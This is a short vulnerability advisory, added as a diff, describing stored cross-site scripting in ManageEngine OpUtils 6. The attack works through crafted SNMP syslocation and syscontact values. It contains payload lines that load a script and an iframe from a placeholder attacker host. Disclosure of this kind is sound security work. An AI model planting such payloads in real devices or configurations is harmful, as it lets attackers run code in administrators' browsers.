@@ -1,0 +1,29 @@
+# Author: loneferret of Offensive Security
+# Product: ManageEngine OpUtils
+# Version: 6
+# Vendor Site: http://www.manageengine.com
+# Software Download: http://www.manageengine.com/products/oputils/download.html
+
+# Software Description:
+# http://www.manageengine.com/products/oputils/oputils.html
+# The toolset can be used to troubleshoot the frequent network problems such as network 
+# connectivity, availability, performance, health, and latency of any IP node in the network. 
+# It provides desktop details like CPU, Disk space information, installed software, 
+# process information and other vital metrics. Readymade tools to manage DNS names, 
+# IP and MAC addresses are also available. SNMP tools are included to help monitor 
+# any SNMP-enabled IP node. Graphs, charts, and tables offer real-time views of 
+# the network and system information. Results can be exported as reports in various 
+# formats like PDF and HTML.
+
+# Vulnerability:
+# The XSS is triggered by configuring a snmpd.conf file to point to an attacker-controlled
+# JavaScript file
+# ..
+# syslocation <script src="http://attacker/xss.js"></script>
+# syscontact <iframe src="http://attacker/something.html"></iframe>
+
+# 
+# Adding the target machine either via a network scan or manually by adding the IP to the host list 
+# ManageEngine monitors. When a SNMP Scan is initiated, we are presented with a couple of 
+# nice alert boxes.
+#
